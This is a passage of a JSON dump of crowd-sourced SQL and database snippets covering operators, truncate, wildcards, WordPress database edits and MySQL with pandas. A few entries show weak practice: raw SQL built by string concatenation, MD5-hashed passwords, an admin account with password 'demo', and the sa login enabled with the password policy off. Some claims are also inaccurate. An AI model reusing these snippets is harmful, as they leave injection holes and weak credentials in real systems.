    "description": "(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \nReturns true if a record DOESN&rsquo;T meet the condition. Example: Returns true if the user&rsquo;s first_name doesn&rsquo;t end with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name NOT LIKE '%son';\n (NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4685,
    "keyword": null,
    "link": null,
    "title": " what is nvl in sql",
    "description": "(NVL) replaces NULL values with same type default value provided. For Example =  Select NVL(commission_percentage, 0) From Employees;\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4686,
    "keyword": null,
    "link": null,
    "title": " what is postgresql",
    "description": "# Install postgres sudo apt-get update sudo apt-get -y install postgresql  sudo su - postgres psql  for connection info : \\conninfo for password : \\password  for roles : \\du for database : \\l  for relation : \\d for table : \\dt\nPostgreSQL is a powerful, open source object-relational database system. It has more than 15 years of active development phase and a proven architecture that has earned it a strong reputation for reliability, data integrity, and correctness.  This tutorial will give you a quick start with PostgreSQL and make you comfortable with PostgreSQL programming.  What is PostgreSQL? PostgreSQL (pronounced as post-gress-Q-L) is an open source relational database management system (DBMS) developed by a worldwide team of volunteers. PostgreSQL is not controlled by any corporation or other private entity and the source code is available free of charge.\nFun fact: \"Postgres\" has exactly as many characters as \"Database\" Check for yourself! Postgres --> 8 chars! Database --> 8 chars!\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4687,
    "keyword": null,
    "link": null,
    "title": " what is primary key",
    "description": "CREATE TABLE `Donor`(   `did` int(50) NOT NULL,   `oid` int(50) NOT NULL,   `dname` varchar(50) NOT NULL,   `dblood` varchar(50) NOT NULL,   PRIMARY KEY (`did`, `oid`) );\nPrimary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL    Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table     Unique Key: Only unique value and also can contain NULL\nPRIMARY KEY    -- unique identifier for the entire row of record in a table    --  can not be null and must be unique \nPRIMARY KEY  -- unique identifier for the entire row of record in a table               -- can not be null and must be unique \nPrimary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL\nCREATE TABLE Persons (     Rollno int NOT NULL,     FirstName varchar(255),     LastName varchar(255),     Age int,     PRIMARY KEY (ID) ); \n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4688,
    "keyword": null,
    "link": null,
    "title": " what is procedure in sql",
    "description": "-Stored procedure is a group of SQL statements that has been created  and stored in the database. -A stored procedure will accept input  parameters so that a single procedure can be used over the network by several clients using different input data. -A stored procedures will reduce network traffic and increase the performance.  If we modify a stored procedure all the clients will get the updated stored procedure.  Sample of creating a stored procedure CREATE PROCEDURE test_display AS SELECT FirstName, LastName FROM tb_test EXEC test_display\nIF OBJECT_ID ( 'Production.uspGetList', 'P' ) IS NOT NULL        DROP PROCEDURE Production.uspGetList;   GO   CREATE PROCEDURE Production.uspGetList @Product varchar(40)        , @MaxPrice money        , @ComparePrice money OUTPUT       , @ListPrice money OUT   AS       SET NOCOUNT ON;       SELECT p.[Name] AS Product, p.ListPrice AS 'List Price'       FROM Production.Product AS p       JOIN Production.ProductSubcategory AS s          ON p.ProductSubcategoryID = s.ProductSubcategoryID       WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice;   -- Populate the output variable @ListPprice.   SET @ListPrice = (SELECT MAX(p.ListPrice)           FROM Production.Product AS p           JOIN  Production.ProductSubcategory AS s              ON p.ProductSubcategoryID = s.ProductSubcategoryID           WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice);   -- Populate the output variable @compareprice.   SET @ComparePrice = @MaxPrice;   GO   \n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4689,
    "keyword": null,
    "link": null,
    "title": " what is relational database",
    "description": "Relational Database Management System (RDBMS) means that tables in database are related using primary/foreign key relationship. Used to store, modify and retrieve data in the database.  &bull; How are they related? Primary Key (unique and not NULL) Foreign Key (duplicate and NULL)  &bull; What type of database system you have expertise with? RDBMS, such as SQL and Oracle &bull; Entity Relation Model (ERM): An entity can be a real-world object, that can be easily identifiable: student, class, teacher. &bull; Attributes: Things that describe the Entity. (student name, age, birthday&hellip;)\nRelational Database = -Tables are structured related to each other -Each specific type of domain data is strored  it's own table  Non-Relational Database = -There is no relation at all between tables -Mostly key+value pair : like jSon\n Non-Relational Database = -There is no relation at all between tables -Mostly key+value pair : like jSon\nNon-Relational Database = -There is no relation at all between tables -Mostly key+value pair : like jSon\nRelational and non-relational database\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4690,
    "keyword": null,
    "link": null,
    "title": " what is rownum in oracle",
    "description": "For each row returned by a query, the ROWNUM pseudocolumn returns a number indicating the order in which Oracle selects the row from a table or set of joined rows. The results can vary depending on the way the rows are accessed. ...\nYou can use ROWNUM to limit the number of rows returned by a query, as in this example: SELECT * FROM employees WHERE ROWNUM < 10; If an ORDER BY clause follows ROWNUM in the same query, then the rows will be reordered by the ORDER BY clause. The results can vary depending on the way the rows are accessed.\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4691,
    "keyword": null,
    "link": null,
    "title": " what is sql",
    "description": "Structured Query Language  A language which enables a user to create, modify and essentially interact with a database. Two of the most common Database Management Engines are MySQL: https://www.mysql.com/ PostgreSQL: https://www.postgresql.org/\nSQL full form is a structured query language, and it allows you to interact through commands with the database. Here are some of the SQL Database functions:  This allows users to retrieve information from the relational database. It enables the development of tables and databases. It allows data base and tables to be modified, added, removed, and changed. It gives protection, and allows permission to be set. Allows new ways for people to manage the info.\nStructured Query Language\nSQL is a domain-specific language used in programming and designed for managing data held in a relational database management system, or for stream processing in a relational data stream management system.\nSQL is basically a programming language that lets people manipulate databases.\nSQL stands for: Structured Query Language  It's language which enables a user to create, modify and essentially interact with a database. As a tester we are usually using Data manipulation language part of SQL  SQL has 2 parts: 1-DATA MANIPULATION LANGUAGE It is used to add, retrieve or update the data. = insert, select, update, delete  2-DATA DEFINITION LANGUAGE It is used to create database schema and can be used to define some constraints as well.\t =create, alter, drop, truncate  create table create window etc.\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4692,
    "keyword": null,
    "link": null,
    "title": " what is sql clause",
    "description": "SELECT and FROM\nWhere clause basically returns only  true conditions  Select First_Name From Customers Where ID = 1905Cimbom;\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4693,
    "keyword": null,
    "link": null,
    "title": " what is subquery in sql",
    "description": "USE AdventureWorks2016; GO SELECT Ord.SalesOrderID, Ord.OrderDate,     (SELECT MAX(OrdDet.UnitPrice)      FROM Sales.SalesOrderDetail AS OrdDet      WHERE Ord.SalesOrderID = OrdDet.SalesOrderID) AS MaxUnitPrice FROM Sales.SalesOrderHeader AS Ord; GO\nWe use subquery in order to get aggregate value in column without grouping data\nSUBQUERY IS NESTED QUERY INSIDE A SELECT,  INSERT OR UPDATE METHODS. OR INSIDE ANOTHER SUBQUERY \nUPDATE Book SET note= 'editore: ' + (SELECT name FROM Publisher WHERE Publisher.ID = Book.publisher)\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4694,
    "keyword": null,
    "link": null,
    "title": " what is table in sql",
    "description": "CREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )\nIt's a table which structured with a set number of columns and a boundless number of rows. Table contains data and stores the data in databases. Once we change information in data it changes in the view aswell.\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4695,
    "keyword": null,
    "link": null,
    "title": " what is the default password for sql server sa",
    "description": "ALTER LOGIN [sa] ENABLE \nALTER LOGIN [sa] WITH PASSWORD='newpassword', CHECK_POLICY=OFF \nEXEC xp_instance_regwrite N'HKEY_LOCAL_MACHINE',      N'Software\\Microsoft\\MSSQLServer\\MSSQLServer', N'LoginMode', REG_DWORD, 2 \n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4696,
    "keyword": null,
    "link": null,
    "title": " what is the use of index in mysql table",
    "description": "Indexes are used to find rows with specific column values quickly. Without an index, MySQL must begin with the first row and then read through the entire table to find the relevant rows. The larger the table, the more this costs.\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4697,
    "keyword": null,
    "link": null,
    "title": " what is truncate",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4698,
    "keyword": null,
    "link": null,
    "title": " what is truncate in sql",
    "description": "TRUNCATE TABLE  table_name; \nTRUNCATE TABLE table;\nDELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n-- Truncate number with cast UPDATE my_table SET my_column = CAST(my_column AS INT) WHERE ...; -- or convert UPDATE my_table SET my_column = CONVERT(INT, my_column) WHERE ...;\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4699,
    "keyword": null,
    "link": null,
    "title": " where case insensitive mysql",
    "description": "SELECT * FROM `table` WHERE LOWER(`Value`) = LOWER(\"THE_VALUE\")\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4700,
    "keyword": null,
    "link": null,
    "title": " where clause for child record apex",
    "description": "Select C1, C2 from A  where  ID in (Select ParentId from B where Status__c='Completed')  and  Id NOT IN (Select ParentId from Opportunity where Status__c <> 'Completed') \n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4701,
    "keyword": null,
    "link": null,
    "title": " where clause vs having sql",
    "description": "The difference between the having and where clause in SQL is that the where clause cannot be used with aggregates(max, min,count,avg,sum) , but the having clause can.\nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4702,
    "keyword": null,
    "link": null,
    "title": " where database run",
    "description": "Currently working with Oracle database that is running in AMAZON CLOUD SERVER.\n",
    "reg_date": "2021-10-12T10:01:34.000Z"
  },
  {
    "id": 4703,
    "keyword": null,
    "link": null,
    "title": " where date = max(date) in sql",
    "description": "SELECT report_id, computer_id, date_entered FROM reports AS a WHERE date_entered = ( SELECT MAX(date_entered) FROM reports );\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4704,
    "keyword": null,
    "link": null,
    "title": " where date in datetime mysql",
    "description": "WHERE DATE(datetime) = '2009-10-20' like this WHERE datetime LIKE '2009-10-20%'\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4705,
    "keyword": null,
    "link": null,
    "title": " where date major today mysql",
    "description": "SELECT * FROM users WHERE created >= CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4706,
    "keyword": null,
    "link": null,
    "title": " where does your database run",
    "description": "Currently working with Oracle database that is running in AMAZON CLOUD SERVER.\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4707,
    "keyword": null,
    "link": null,
    "title": " where id is in list sql",
    "description": "select * from table where id in (id1,id2.........long list)\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4708,
    "keyword": null,
    "link": null,
    "title": " where in mysql w3schools",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4709,
    "keyword": null,
    "link": null,
    "title": " where sql multiple conditions",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nSELECT * FROM suppliers WHERE (state = 'California' AND supplier_id <> 900) OR (supplier_id = 100);\nSELECT items.* FROM items i, meta_data m1, meta_data m2     WHERE i.item_id = m1.item_id and i.item_id = m2.item_id     AND m1.meta_key = 'lat' AND m1.meta_value >= 55 AND m1.meta_value <= 65     AND m2.meta_key = 'lng' AND m2.meta_value >= 20 AND m2.meta_value <= 30\nSQL> SELECT ID, NAME, SALARY  FROM CUSTOMERS WHERE SALARY > 2000 OR age < 25;\n+----+----------+----------+ | ID | NAME     | SALARY   | +----+----------+----------+ |  3 | kaushik  |  2000.00 | |  4 | Chaitali |  6500.00 | |  5 | Hardik   |  8500.00 | |  6 | Komal    |  4500.00 | |  7 | Muffy    | 10000.00 | +----+----------+----------+ \n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4710,
    "keyword": null,
    "link": null,
    "title": " where to find pg hba.conf in ubuntu",
    "description": "SHOW hba_file; \n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4711,
    "keyword": null,
    "link": null,
    "title": " where to locate set password for mysql",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED BY 'PASSWORD'; \n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4712,
    "keyword": null,
    "link": null,
    "title": " wherein mysql",
    "description": "SELECT Id FROM Table WHERE NAME IN ('John', 'Jim', 'Bill') \nSELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\n",
    "reg_date": "2021-10-12T10:01:35.000Z"
  },
  {
    "id": 4713,
    "keyword": null,
    "link": null,
    "title": " which is better to read mongodb and mysql for c++ programmer",
    "description": "''' MySQL is a relational database management system (RDBMS) from the  Oracle Corporation. Like other relational systems, MySQL stores data  in tables and uses structured query language (SQL) for database  access. When MySQL developers need to access data in an application,  they merge data from multiple tables together in a process called a  join. In MySQL, you predefine your database schema and set up rules  to govern the relationships between fields in your tables.  MongoDB is a NoSQL database that stores data as JSON-like documents.  Documents store related information together and use the MongoDB  query language (MQL) for access. Fields can vary from document to  document - there is no need to declare the structure of documents to  the system, as documents are self-describing. Optionally, schema  validation can be used to enforce data governance controls over each  collection. '''\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4714,
    "keyword": null,
    "link": null,
    "title": " while loop sql",
    "description": "/* while loop SQL Server */ DECLARE @Counter INT  SET @Counter = 1 WHILE (@Counter <= 10) BEGIN     PRINT 'The counter value is = ' + CONVERT(VARCHAR, @Counter)     SET @Counter = @Counter  + 1 END\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4715,
    "keyword": null,
    "link": null,
    "title": " why we use subquery in sql",
    "description": "We use subquery in order to get aggregate value in column without grouping data\nSUBQUERY IS NESTED QUERY INSIDE A SELECT,  INSERT OR UPDATE METHODS. OR INSIDE ANOTHER SUBQUERY \nUPDATE Book SET note= 'editore: ' + (SELECT name FROM Publisher WHERE Publisher.ID = Book.publisher)\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4716,
    "keyword": null,
    "link": null,
    "title": " wilayah indonesia database",
    "description": "# https://raw.githubusercontent.com/edwardsamuel/Wilayah-Administratif-Indonesia/master/mysql/indonesia.sql # have 4 table provincies, regencies, districts, villages\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4717,
    "keyword": null,
    "link": null,
    "title": " wilayah indonesia sql",
    "description": "# https://raw.githubusercontent.com/edwardsamuel/Wilayah-Administratif-Indonesia/master/mysql/indonesia.sql # have 4 table provincies, regencies, districts, villages\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4718,
    "keyword": null,
    "link": null,
    "title": " wildcard",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4719,
    "keyword": null,
    "link": null,
    "title": " wildcard in sql",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                c[a-b]t   'cat, cbt'\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4720,
    "keyword": null,
    "link": null,
    "title": " will sqlite update create a new row if row doesnt exist",
    "description": "INSERT INTO example(column1, column2)  SELECT value_to_insert1, value_to_insert2  WHERE NOT EXISTS(SELECT 1 FROM example WHERE column1 = value_to_insert AND column2 = value_to_insert);\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4721,
    "keyword": null,
    "link": null,
    "title": " window function mysql",
    "description": "A window function in MySQL used to do a calculation across a set of rows that are related to the current row. The current row is that row for which function evaluation occurs. Window functions perform a calculation similar to a calculation done by using the aggregate functions.\n",
    "reg_date": "2021-10-12T10:01:36.000Z"
  },
  {
    "id": 4722,
    "keyword": null,
    "link": null,
    "title": " windows aggregate functions in postgresql",
    "description": "SELECT depname, empno, salary, avg(salary) OVER (PARTITION BY depname) FROM empsalary; \n  depname  | empno | salary |          avg           -----------+-------+--------+-----------------------  develop   |    11 |   5200 | 5020.0000000000000000  develop   |     7 |   4200 | 5020.0000000000000000  develop   |     9 |   4500 | 5020.0000000000000000  develop   |     8 |   6000 | 5020.0000000000000000  develop   |    10 |   5200 | 5020.0000000000000000  personnel |     5 |   3500 | 3700.0000000000000000  personnel |     2 |   3900 | 3700.0000000000000000  sales     |     3 |   4800 | 4866.6666666666666667  sales     |     1 |   5000 | 4866.6666666666666667  sales     |     4 |   4800 | 4866.6666666666666667 (10 rows) \n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4723,
    "keyword": null,
    "link": null,
    "title": " with in sql server",
    "description": "Specifies a temporary named result set, known as a common table expression (CTE). This is derived from a simple query and defined within the execution scope of a single SELECT, INSERT, UPDATE, DELETE or MERGE statement. This clause can also be used in a CREATE VIEW statement as part of its defining SELECT statement. A common table expression can include references to itself. This is referred to as a recursive common table expression. -- Define the CTE expression name and column list.   WITH Sales_CTE (SalesPersonID, SalesOrderID, SalesYear)   AS   -- Define the CTE query.   (       SELECT SalesPersonID, SalesOrderID, YEAR(OrderDate) AS SalesYear       FROM Sales.SalesOrderHeader       WHERE SalesPersonID IS NOT NULL   )   -- Define the outer query referencing the CTE name.   SELECT SalesPersonID, COUNT(SalesOrderID) AS TotalSales, SalesYear   FROM Sales_CTE   GROUP BY SalesYear, SalesPersonID   ORDER BY SalesPersonID, SalesYear;\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4724,
    "keyword": null,
    "link": null,
    "title": " woocommerce mysql price table",
    "description": "//for Regular Price UPDATE wp_postmeta  SET meta_value = diff_price_value  WHERE post_id = variation_id AND meta_key = '_regular_price';  //for Price UPDATE wp_postmeta  SET meta_value = price_value  WHERE post_id = variation_id AND meta_key = '_price';  //for Sale Price UPDATE wp_postmeta  SET meta_value = price_value  WHERE post_id = variation_id AND meta_key = '_sale_price';\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4725,
    "keyword": null,
    "link": null,
    "title": " wordpress address url accidentally changed",
    "description": "USE wp_database_name UPDATE wp_options SET option_value=\"new_value\" WHERE option_name=\"siteurl\"; UPDATE wp_options SET option_value=\"new_value\" WHERE option_name=\"home\";\n// wp-content/theme_name/functions.php  update_option( 'siteurl', 'new_value' ); update_option( 'home', 'new_value' );  // wp-config.php  define( 'WP_HOME', 'new_value' ); define( 'WP_SITEURL', 'new_value' );\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4726,
    "keyword": null,
    "link": null,
    "title": " wordpress change http to https phpmyadmin",
    "description": "UPDATE wp_options SET option_value = replace(option_value, 'oldurl.com', 'newurl.com') WHERE option_name = 'home' OR option_name = 'siteurl'; UPDATE wp_posts SET guid = replace(guid, 'oldurl.com','newurl.com'); UPDATE wp_posts SET post_content = replace(post_content, 'oldurl.com', 'newurl.com'); UPDATE wp_postmeta SET meta_value = replace(meta_value,'oldurl.com','newurl.com');\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4727,
    "keyword": null,
    "link": null,
    "title": " wordpress change url in database",
    "description": "UPDATE wp_options SET option_value = replace(option_value, 'http://www.oldurl', 'http://www.newurl') WHERE option_name = 'home' OR option_name = 'siteurl';  UPDATE wp_posts SET guid = replace(guid, 'http://www.oldurl','http://www.newurl');  UPDATE wp_posts SET post_content = replace(post_content, 'http://www.oldurl', 'http://www.newurl');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'http://www.oldurl','http://www.newurl');\n# Check your table prefix # Change all the tables   UPDATE wp_options SET option_value =  replace(option_value, 'oldurl.com', 'newurl.com') WHERE option_name = 'home'  OR option_name = 'siteurl';UPDATE wp_posts SET guid =  replace(guid, 'oldurl.com','newurl.com'); UPDATE wp_posts SET post_content = replace(post_content, 'oldurl.com', 'newurl.com');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'oldurl.com','newurl.com');\noptions table 1. siteurl 2. home  ######## OR ########  // Add to top of wp-config.php define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' ); \n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4728,
    "keyword": null,
    "link": null,
    "title": " wordpress change user password sql",
    "description": "UPDATE `wp_users` SET `user_pass` = MD5( 'new_password' ) WHERE `wp_users`.`user_login` = \"admin_username\";\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4729,
    "keyword": null,
    "link": null,
    "title": " wordpress database query change url",
    "description": "UPDATE wp_options SET option_value = replace(option_value, 'http://www.oldurl', 'http://www.newurl') WHERE option_name = 'home' OR option_name = 'siteurl';  UPDATE wp_posts SET guid = replace(guid, 'http://www.oldurl','http://www.newurl');  UPDATE wp_posts SET post_content = replace(post_content, 'http://www.oldurl', 'http://www.newurl');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'http://www.oldurl','http://www.newurl');\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4730,
    "keyword": null,
    "link": null,
    "title": " wordpress make wp user in db",
    "description": "INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');     INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');     INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10'); \n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4731,
    "keyword": null,
    "link": null,
    "title": " wordpress sql change site url",
    "description": "# Check your table prefix # Change all the tables   UPDATE wp_options SET option_value =  replace(option_value, 'oldurl.com', 'newurl.com') WHERE option_name = 'home'  OR option_name = 'siteurl';UPDATE wp_posts SET guid =  replace(guid, 'oldurl.com','newurl.com'); UPDATE wp_posts SET post_content = replace(post_content, 'oldurl.com', 'newurl.com');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'oldurl.com','newurl.com');\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4732,
    "keyword": null,
    "link": null,
    "title": " wordpress sql find and replace",
    "description": "UPDATE wp_options SET option_value = replace(option_value, 'http://www.oldurl', 'http://www.newurl') WHERE option_name = 'home' OR option_name = 'siteurl';  UPDATE wp_posts SET guid = replace(guid, 'http://www.oldurl','http://www.newurl');  UPDATE wp_posts SET post_content = replace(post_content, 'http://www.oldurl', 'http://www.newurl');  UPDATE wp_postmeta SET meta_value = replace(meta_value,'http://www.oldurl','http://www.newurl');\n",
    "reg_date": "2021-10-12T10:01:37.000Z"
  },
  {
    "id": 4733,
    "keyword": null,
    "link": null,
    "title": " working with mysql database in pandas",
    "description": "import mysql.connector import pandas as pd  db_connection = mysql.connector.connect(   host=\"localhost\",   user=\"user\",   password=\"password\",   database=\"dbname\",   auth_plugin='mysql_native_password' )  df = pd.read_sql(\"select * from table_name;\", con=db_connection) print(df) \nImporting data from a MySQL database into a Pandas data frame including column names:- import mysql.connector as sql. import pandas as pd. db_connection = sql.connect(host='hostname', database='db_name', user='username', password='password') db_cursor = db_connection.cursor() db_cursor.execute('SELECT * FROM table_name')\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4734,
    "keyword": null,
    "link": null,
    "title": " wp do sql query from function",
    "description": "<?php // 1st Method - Declaring $wpdb as global and using it to execute an SQL query statement that returns a PHP object global $wpdb; $results = $wpdb->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT ); \n<?php // 2nd Method - Utilizing the $GLOBALS superglobal. Does not require global keyword ( but may not be best practice ) $results = $GLOBALS['wpdb']->get_results( \"SELECT * FROM {$wpdb->prefix}options WHERE option_id = 1\", OBJECT ); \n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4735,
    "keyword": null,
    "link": null,
    "title": " wp query raw sql",
    "description": "global $wpdb; $post_id = $wpdb->get_results(\"SELECT post_id FROM $wpdb->postmeta WHERE (meta_key = 'mfn-post-link1' AND meta_value = '\". $from .\"')\");\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4736,
    "keyword": null,
    "link": null,
    "title": " write to file plsql",
    "description": "DECLARE    path_file          varchar2(100):='/path/to/directory/';    file_name          varchar2(100):='file_name.txt';    out_file           utl_file.file_type; BEGIN    out_file := utl_file.fopen(path_file,file_name,'w');    UTL_FILE.put_line (out_file, 'Line 1');    UTL_FILE.put_line (out_file, 'Line 2');    UTL_FILE.FCLOSE(out_file); EXCEPTION   WHEN OTHERS THEN     IF UTL_FILE.is_open(out_file) THEN       UTL_FILE.fclose(out_file);     END IF; END;\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4737,
    "keyword": null,
    "link": null,
    "title": " xamarin sqlite get each row of table",
    "description": "    public List<AlbumTable> getalldata() {         try {             using (var connection = new SQLiteConnection(Path.Combine(dir.AbsolutePath, \"album.db\"))) {                 return connection.Table<AlbumTable>().ToList();             }         }         catch (SQLiteException ex) {             return null;         }     }\n",
    "reg_date": "2021-10-12T10:01:38.000Z"
  },
  {
    "id": 4738,
    "keyword": null,
    "link": null,
    "title": " xampp Error: MySQL shutdown unexpectedly.",
